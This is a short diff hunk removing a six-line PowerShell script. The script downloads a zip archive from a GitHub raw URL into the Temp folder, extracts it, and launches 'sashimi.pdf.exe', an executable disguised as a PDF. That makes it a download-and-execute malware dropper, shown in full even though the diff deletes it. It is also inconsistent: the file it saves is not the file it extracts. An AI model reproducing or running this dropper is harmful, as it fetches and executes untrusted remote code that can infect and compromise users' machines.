@@ -1,6 +1,0 @@
-mkdir $env:Temp\Sashimi
-cd $env:Temp\Sashimi
-Invoke-WebRequest -OutFile $env:Temp\townhall.pdf.zip "https://github.com/e0X1337/e0X1337/raw/refs/heads/main/sashimi.pdf.zip"
-$file1 = "$env:Temp\sashimi.pdf.zip"
-Expand-Archive -Path $file1 -DestinationPath . -Force
-Start-Process .\sashimi.pdf.exe
